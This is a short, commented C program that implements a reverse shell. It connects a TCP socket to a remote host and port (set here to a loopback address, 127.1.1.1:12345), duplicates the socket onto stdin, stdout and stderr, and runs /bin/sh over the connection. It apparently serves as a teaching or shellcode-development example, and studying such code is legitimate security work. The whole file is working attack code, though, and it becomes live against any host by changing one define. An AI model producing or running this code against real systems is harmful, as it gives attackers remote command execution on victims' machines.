#include <unistd.h> // dup2, execve
#include <netinet/in.h> // socket structures and constants
#include <arpa/inet.h> // inet_addr

#define RHOST "127.1.1.1"
#define RPORT 12345

int main() {
  int sockfd;
  struct sockaddr_in remote_addr;

  // socket  IP, TCP, TCP
  sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);


  // Remote connection
  remote_addr.sin_family = AF_INET; // ipv4
  remote_addr.sin_port = htons(RPORT); // port in the correct endianness
  remote_addr.sin_addr.s_addr = inet_addr(RHOST);

  // Connect to RHOST (which is localhost in this case) on port 12345
  connect(sockfd, (struct sockaddr*) &remote_addr, sizeof(remote_addr));


  // overwritting fd's
  dup2(sockfd, 0); // stdin
  dup2(sockfd, 1); // stdout
  dup2(sockfd, 2); // stderr


  // execute shell over socket
  execve("/bin/sh", NULL, NULL);

  return 0;
}
